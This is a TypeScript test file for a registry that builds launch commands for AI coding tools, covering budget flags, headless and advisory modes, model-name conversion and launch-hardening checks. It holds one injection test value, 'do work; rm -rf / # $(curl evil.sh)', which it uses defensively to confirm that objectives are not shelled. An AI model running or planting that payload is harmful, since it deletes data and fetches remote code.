/**
 * @module SessionAdapterRegistryTest
 * @path packages/session/tests/adapter_registry_test.ts
 * @description Phase 106 Step 2 + Phase 111 Step 1 — tests for the session-adapter
 *   registry and the five built-in adapters. Covers resolution, unknown-tool rejection,
 *   supervised argv with budget flags, advisory-only IDE tools, return synthesis, headless
 *   argv for CLI tools, IDE tool headless rejection, and the GAP-4 launch-hardening
 *   invariants (no objective in argv for non-headless; no secrets in env).
 */

import { assertEquals, assertThrows } from "@std/assert";
import { SessionBriefSchema, SessionReturnSchema } from "@exaix/schemas/session_delegate.ts";
import type { SessionBrief } from "@exaix/schemas/session_delegate.ts";
import {
  createDefaultSessionAdapterRegistry,
  SessionAdapterRegistry,
} from "@exaix/session/session_adapter_registry.ts";

const BRIEF_PATH = "/tmp/exa-session/trace-1/brief.json";
const MALICIOUS_OBJECTIVE = "do work; rm -rf / # $(curl evil.sh)";

function makeBrief(overrides: Partial<SessionBrief> = {}): SessionBrief {
  return SessionBriefSchema.parse({
    trace_id: "00000000-0000-4000-8000-0000000000aa",
    gate: "code_changes",
    tool: "claude-code",
    objective: MALICIOUS_OBJECTIVE,
    artifact_ref: "Workspace/Plans/req-01_plan.md",
    permitted_paths: ["src/**"],
    worktree_path: "/tmp/worktree/trace-1",
    token_budget: { max_input_tokens: 40_000, max_output_tokens: 30_000, max_total_tokens: 70_000 },
    resume_token: "tok-2",
    deadline: "2026-07-01T00:00:00.000Z",
    ...overrides,
  });
}

Deno.test("[session_adapter] default registry resolves every supported tool", () => {
  const registry = createDefaultSessionAdapterRegistry();
  for (const tool of ["claude-code", "opencode", "codex", "cursor", "vscode"] as const) {
    const adapter = registry.resolve(tool);
    assertEquals(adapter.tool, tool);
  }
  assertEquals(registry.list(), ["claude-code", "opencode", "codex", "cursor", "vscode"]);
});

Deno.test("[session_adapter] resolve throws on an unregistered tool", () => {
  const registry = new SessionAdapterRegistry();
  assertThrows(() => registry.resolve("claude-code"));
});

Deno.test("[session_adapter] claude-code + opencode produce supervised argv with the budget flag", () => {
  const registry = createDefaultSessionAdapterRegistry();
  for (const tool of ["claude-code", "opencode"] as const) {
    const launch = registry.resolve(tool).buildLaunch(makeBrief({ tool }), "supervised", BRIEF_PATH);
    assertEquals(launch.args.includes("--max-total-tokens"), true, `${tool} argv must carry the budget flag`);
  }
});

Deno.test("[session_adapter] cursor + vscode reject supervised launch (advisory only)", () => {
  const registry = createDefaultSessionAdapterRegistry();
  for (const tool of ["cursor", "vscode"] as const) {
    const adapter = registry.resolve(tool);
    assertEquals(adapter.supportsSupervised, false);
    assertThrows(
      () =>
        adapter.buildLaunch(
          makeBrief({ tool, gate: "plan_review", worktree_path: undefined }),
          "supervised",
          BRIEF_PATH,
        ),
      Error,
    );
  }
});

Deno.test("[session_adapter] advisory launch is permitted for every tool", () => {
  const registry = createDefaultSessionAdapterRegistry();
  for (const tool of ["claude-code", "opencode", "cursor", "vscode"] as const) {
    const launch = registry.resolve(tool).buildLaunch(makeBrief({ tool }), "advisory", BRIEF_PATH);
    assertEquals(typeof launch.command, "string");
    assertEquals(launch.command.length > 0, true);
  }
});

Deno.test("[session_adapter][security] GAP-4 — the brief objective never reaches command or argv", () => {
  const registry = createDefaultSessionAdapterRegistry();
  for (const tool of ["claude-code", "opencode", "cursor", "vscode"] as const) {
    const mode = tool === "cursor" || tool === "vscode" ? "advisory" : "supervised";
    const launch = registry.resolve(tool).buildLaunch(makeBrief({ tool }), mode, BRIEF_PATH);
    const surface = [launch.command, ...launch.args].join("\0");
    assertEquals(surface.includes(MALICIOUS_OBJECTIVE), false, `${tool}: objective must not be in the command line`);
    assertEquals(surface.includes("rm -rf"), false, `${tool}: shell payload must not be in the command line`);
  }
});

Deno.test("[session_adapter][security] GAP-4 — launch env carries no API-key secret", () => {
  const registry = createDefaultSessionAdapterRegistry();
  const launch = registry.resolve("claude-code").buildLaunch(makeBrief(), "supervised", BRIEF_PATH);
  for (const key of Object.keys(launch.env)) {
    assertEquals(/API_KEY/i.test(key), false, `env must not expose a secret-bearing var: ${key}`);
  }
  assertEquals(launch.env["EXA_SESSION_MAX_TOTAL_TOKENS"], "70000");
});

Deno.test("[session_adapter] CLI tools support headless; IDE tools do not", () => {
  const registry = createDefaultSessionAdapterRegistry();
  assertEquals(registry.resolve("claude-code").supportsHeadless, true);
  assertEquals(registry.resolve("opencode").supportsHeadless, true);
  assertEquals(registry.resolve("cursor").supportsHeadless, false);
  assertEquals(registry.resolve("vscode").supportsHeadless, false);
});

Deno.test("[session_adapter] claude-code headless argv contains -p, objective and --output-format json", () => {
  const registry = createDefaultSessionAdapterRegistry();
  const brief = makeBrief({ tool: "claude-code", objective: "Refactor the auth module" });
  const launch = registry.resolve("claude-code").buildLaunch(brief, "headless", BRIEF_PATH);
  assertEquals(launch.args[0], "-p", "headless claude-code must start with -p");
  assertEquals(launch.args.includes("Refactor the auth module"), true, "objective must be a discrete argv item");
  assertEquals(launch.args.includes("--brief"), false, "claude-code does not support --brief flag");
  assertEquals(launch.args.includes("--max-total-tokens"), false, "claude-code does not support --max-total-tokens");
  assertEquals(launch.args.includes("--output-format"), true, "must specify output format");
  assertEquals(launch.args.includes("json"), true, "must request JSON output for stdout capture");
  assertEquals(launch.args.includes("json"), true, "output format must be json");
});

Deno.test("[session_adapter] opencode headless argv contains run, --format json, --dir, objective", () => {
  const registry = createDefaultSessionAdapterRegistry();
  const brief = makeBrief({ tool: "opencode", objective: "Implement feature X" });
  const launch = registry.resolve("opencode").buildLaunch(brief, "headless", BRIEF_PATH);
  assertEquals(launch.args[0], "run", "headless opencode must start with `run` subcommand");
  assertEquals(launch.args[1], "--format", "opencode uses --format (not --output-format)");
  assertEquals(launch.args[2], "json", "must request JSON output for return synthesis");
  assertEquals(launch.args[3], "--dir", "opencode must include --dir for worktree path resolution");
  assertEquals(launch.args[4], brief.worktree_path, "--dir must be followed by the worktree path");
  assertEquals(launch.args.includes("Implement feature X"), true, "objective must be a discrete argv item");
  assertEquals(launch.args.includes("--brief"), false, "opencode does not support --brief flag");
  assertEquals(launch.args.includes("--max-total-tokens"), false, "opencode does not support --max-total-tokens");
  assertEquals(launch.cwd, brief.worktree_path, "cwd must match the worktree path");
});

Deno.test("[session_adapter] codex is headless-only and builds exec --json argv with an unprefixed model", () => {
  const registry = createDefaultSessionAdapterRegistry();
  const adapter = registry.resolve("codex");
  const brief = makeBrief({
    tool: "codex",
    model: "openai:gpt-5.3-codex",
    objective: MALICIOUS_OBJECTIVE,
  });

  assertEquals(adapter.supportsSupervised, false);
  assertEquals(adapter.supportsHeadless, true);
  assertThrows(() => adapter.buildLaunch(brief, "supervised", BRIEF_PATH), Error);

  const launch = adapter.buildLaunch(brief, "headless", BRIEF_PATH);
  assertEquals(launch.command, "codex");
  assertEquals(launch.args, [
    "exec",
    "--json",
    "--model",
    "gpt-5.3-codex",
    "--sandbox",
    "read-only",
    MALICIOUS_OBJECTIVE,
  ]);
});

Deno.test("[session_adapter] cursor + vscode reject headless launch", () => {
  const registry = createDefaultSessionAdapterRegistry();
  for (const tool of ["cursor", "vscode"] as const) {
    const adapter = registry.resolve(tool);
    assertEquals(adapter.supportsHeadless, false);
    assertThrows(
      () =>
        adapter.buildLaunch(
          makeBrief({ tool, gate: "plan_review", worktree_path: undefined }),
          "headless",
          BRIEF_PATH,
        ),
      Error,
    );
  }
});

Deno.test("[session_adapter][security] headless launch env carries no API-key secret", () => {
  const registry = createDefaultSessionAdapterRegistry();
  const launch = registry.resolve("claude-code").buildLaunch(
    makeBrief({ tool: "claude-code" }),
    "headless",
    BRIEF_PATH,
  );
  for (const key of Object.keys(launch.env)) {
    assertEquals(/API_KEY/i.test(key), false, `env must not expose a secret-bearing var: ${key}`);
  }
  assertEquals(launch.env["EXA_SESSION_MAX_TOTAL_TOKENS"], "70000");
});

Deno.test("[session_adapter][security] headless mode objective is a discrete argv item (not shelled)", () => {
  const registry = createDefaultSessionAdapterRegistry();
  const brief = makeBrief({ tool: "claude-code", objective: MALICIOUS_OBJECTIVE });
  const launch = registry.resolve("claude-code").buildLaunch(brief, "headless", BRIEF_PATH);
  const surface = launch.args.join("\x00");
  assertEquals(surface.includes(MALICIOUS_OBJECTIVE), true, "objective IS in argv for headless (by design)");
  assertEquals(
    launch.args.includes(MALICIOUS_OBJECTIVE),
    true,
    "objective is a single discrete item, never split by shell",
  );
});

Deno.test("[session_adapter] opencode headless emits --model <model> when the brief carries a model", () => {
  const registry = createDefaultSessionAdapterRegistry();
  const brief = makeBrief({ tool: "opencode", model: "deepseek-v4-flash", objective: "Implement feature X" });
  const launch = registry.resolve("opencode").buildLaunch(brief, "headless", BRIEF_PATH);
  const modelIdx = launch.args.indexOf("--model");
  assertEquals(modelIdx >= 0, true, "opencode headless must include --model when a model is set");
  assertEquals(launch.args[modelIdx + 1], "deepseek-v4-flash", "--model must be followed by the model value");
  assertEquals(launch.args[launch.args.length - 1], "Implement feature X", "objective stays the trailing positional");
});

// Phase 150 LIVE-RT: prepareBrief requires provider:model (colon) form, and
// ModelResolver produces it. OpenCode's `--model` flag uses provider/model (slash).
// The adapter must convert the colon to a slash for opencode, analogously to how
// claude-code's adapter strips the prefix entirely.
Deno.test("[session_adapter] opencode headless converts provider:model to provider/model for --model", () => {
  const registry = createDefaultSessionAdapterRegistry();
  const brief = makeBrief({
    tool: "opencode",
    model: "opencode:deepseek-v4-flash-free",
    objective: "Implement feature X",
  });
  const launch = registry.resolve("opencode").buildLaunch(brief, "headless", BRIEF_PATH);
  const modelIdx = launch.args.indexOf("--model");
  assertEquals(modelIdx >= 0, true, "opencode headless must include --model");
  assertEquals(
    launch.args[modelIdx + 1],
    "opencode/deepseek-v4-flash-free",
    "opencode --model uses provider/model (slash), not provider:model (colon)",
  );
});

Deno.test("[session_adapter] claude-code headless emits --model <model> when the brief carries a model", () => {
  const registry = createDefaultSessionAdapterRegistry();
  const brief = makeBrief({ tool: "claude-code", model: "claude-sonnet-4-6", objective: "Refactor auth" });
  const launch = registry.resolve("claude-code").buildLaunch(brief, "headless", BRIEF_PATH);
  const modelIdx = launch.args.indexOf("--model");
  assertEquals(modelIdx >= 0, true, "claude-code headless must include --model when a model is set");
  assertEquals(launch.args[modelIdx + 1], "claude-sonnet-4-6", "--model must be followed by the model value");
});

Deno.test("[session_adapter] headless omits --model when the brief has no model", () => {
  const registry = createDefaultSessionAdapterRegistry();
  for (const tool of ["claude-code", "opencode", "codex"] as const) {
    const launch = registry.resolve(tool).buildLaunch(makeBrief({ tool }), "headless", BRIEF_PATH);
    assertEquals(launch.args.includes("--model"), false, `${tool}: no --model flag when model is unset`);
  }
});

Deno.test("[session_adapter] synthesizeReturn builds a schema-valid, gate-legal return", () => {
  const registry = createDefaultSessionAdapterRegistry();
  const brief = makeBrief({ gate: "code_changes" });
  const synthesized = registry.resolve("opencode").synthesizeReturn(brief, ["src/feature.ts"]);
  const parsed = SessionReturnSchema.safeParse(synthesized);
  assertEquals(parsed.success, true);
  if (!parsed.success) return;
  assertEquals(parsed.data.trace_id, brief.trace_id);
  assertEquals(parsed.data.resume_token, brief.resume_token);
  assertEquals(parsed.data.decision, "changes_made");
  assertEquals(parsed.data.paths_touched, ["src/feature.ts"]);
});

// Phase 150 LIVE-RT: the daemon resolves models to `provider:model`
// (apps/daemon/main.ts resolveRequestModel) and prepareBrief REQUIRES that colon
// form. The claude CLI rejects a provider-prefixed id ("It may not exist or you
// may not have access to it"), so the adapter must strip the prefix when building
// --model. Verified against claude CLI 2.1.217.
Deno.test("[session_adapter] claude-code headless strips the provider prefix from --model", () => {
  const registry = createDefaultSessionAdapterRegistry();
  const brief = makeBrief({
    tool: "claude-code",
    model: "anthropic:claude-sonnet-5",
    objective: "Refactor auth",
  });
  const launch = registry.resolve("claude-code").buildLaunch(brief, "headless", BRIEF_PATH);
  const modelIdx = launch.args.indexOf("--model");
  assertEquals(modelIdx >= 0, true, "claude-code headless must include --model");
  assertEquals(
    launch.args[modelIdx + 1],
    "claude-sonnet-5",
    "the claude CLI rejects a provider-prefixed model id — the prefix must be stripped",
  );
});

Deno.test("[session_adapter] claude-code headless leaves an unprefixed model untouched", () => {
  const registry = createDefaultSessionAdapterRegistry();
  const brief = makeBrief({ tool: "claude-code", model: "claude-sonnet-5", objective: "x" });
  const launch = registry.resolve("claude-code").buildLaunch(brief, "headless", BRIEF_PATH);
  assertEquals(launch.args[launch.args.indexOf("--model") + 1], "claude-sonnet-5");
});
